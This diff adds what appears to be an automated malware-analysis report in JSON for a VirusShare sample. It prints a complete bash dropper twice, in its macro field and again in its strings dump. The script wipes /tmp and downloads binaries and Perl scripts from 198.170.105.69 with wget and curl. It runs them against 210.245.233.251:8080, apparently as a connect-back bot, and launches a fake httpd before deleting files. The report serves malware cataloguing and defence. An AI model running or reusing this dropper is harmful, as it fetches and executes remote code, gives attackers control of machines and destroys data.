@@ -1,0 +1,91 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "mkdir": "May create a directory"
+        },
+        "macro": "#!/bin/bash\ncd /tmp\nrm -rf *\nmkdir .temp\ncd .temp\nif [ -f cb ]; then\n/bin/chmod +x cb\n./cb 210.245.233.251 8080 &\nelse\nwget 198.170.105.69/cb\n/bin/chmod +x cb\n./cb 210.245.233.251 8080 &\nfi\nif [ -f https ]; then\nperl https\nelse\nwget 198.170.105.69/https\ncurl -o https 198.170.105.69/https\nperl https\nfi\nif [ -f ping.txt ]; then\nperl ping.txt 210.245.233.251 8080 &\nelse\ncurl -o ping.txt http://198.170.105.69/ping.txt\nperl ping.txt 210.245.233.251 8080 &\nfi\nif [ -f httpd ]; then\n/bin/chmod +x httpd\nexport PATH=\".\"\nhttpd\nelse\nwget 198.170.105.69/httpd\nchmod +x httpd\nexport PATH=\".\"\nhttpd\nfi\nif [ -f httpd ]; then\n/bin/chmod +x httpd\nexport PATH=\".\"\nhttpd\nelse\ncurl -o httpd 198.170.105.69/httpd\n/bin/chmod +x httpd\nexport PATH=\".\"\nhttpd\nfi\n/bin/rm -rf /tmp/su*"
+    },
+    "filename": "VirusShare_0911511424a574595cfeff076a77bc0b",
+    "filesize": 808,
+    "filetype": "Bourne-Again shell script, ASCII text executable, with CRLF line terminators",
+    "hashes": {
+        "md5": "0911511424a574595cfeff076a77bc0b",
+        "sha1": "08b7509813789e4ed1230b42afd402b73f766b88",
+        "sha256": "46b5f41440c89b8d437237a93a6441ef64857a2926117ed55744e061d0ce37bf"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/bash",
+            "cd /tmp",
+            "rm -rf *",
+            "mkdir .temp",
+            "cd .temp",
+            "if [ -f cb ]; then",
+            "/bin/chmod +x cb",
+            "./cb 210.245.233.251 8080 &",
+            "else",
+            "wget 198.170.105.69/cb",
+            "/bin/chmod +x cb",
+            "./cb 210.245.233.251 8080 &",
+            "if [ -f https ]; then",
+            "perl https",
+            "else",
+            "wget 198.170.105.69/https",
+            "curl -o https 198.170.105.69/https",
+            "perl https",
+            "if [ -f ping.txt ]; then",
+            "perl ping.txt 210.245.233.251 8080 &",
+            "else",
+            "curl -o ping.txt http://198.170.105.69/ping.txt",
+            "perl ping.txt 210.245.233.251 8080 &",
+            "if [ -f httpd ]; then",
+            "/bin/chmod +x httpd",
+            "export PATH=\".\"",
+            "httpd",
+            "else",
+            "wget 198.170.105.69/httpd",
+            "chmod +x httpd",
+            "export PATH=\".\"",
+            "httpd",
+            "if [ -f httpd ]; then",
+            "/bin/chmod +x httpd",
+            "export PATH=\".\"",
+            "httpd",
+            "else",
+            "curl -o httpd 198.170.105.69/httpd",
+            "/bin/chmod +x httpd",
+            "export PATH=\".\"",
+            "httpd",
+            "/bin/rm -rf /tmp/su*"
+        ],
+        "file": {
+            "curl -o ping.txt http://198.170.105.69/ping.txt": "Text"
+        },
+        "fuzzing": {
+            "Possible connections": [
+                "wget 198.170.105.69/cb",
+                "wget 198.170.105.69/https",
+                "curl -o https 198.170.105.69/https",
+                "curl -o ping.txt http://198.170.105.69/ping.txt",
+                "wget 198.170.105.69/httpd",
+                "curl -o httpd 198.170.105.69/httpd"
+            ]
+        },
+        "ip": [
+            "210.245.233.251",
+            "198.170.105.69"
+        ],
+        "url": [
+            "http://198.170.105.69/ping.txt"
+        ]
+    },
+    "time": "0:00:00.279910",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
